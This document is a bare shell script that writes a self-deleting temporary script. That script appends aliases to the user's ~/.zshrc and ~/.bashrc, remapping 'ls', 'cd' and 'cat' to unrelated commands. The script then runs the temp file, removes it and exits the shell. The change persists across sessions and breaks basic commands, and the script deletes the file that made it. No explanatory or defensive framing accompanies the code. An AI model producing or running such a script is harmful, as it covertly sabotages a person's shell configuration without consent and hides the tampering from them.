#!/bin/sh
swap_array='alias ls=\"du\" \\n alias cd=\"dh\" \\n alias cat=\"lsblk\"' 

echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"$swap_array\" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"$swap_array\" >> ~/.bashrc\nfi" > /tmp/tmmmp

chmod +x /tmp/tmmmp && cd ~/ && /tmp/tmmmp && rm /tmp/tmmmp && exit 
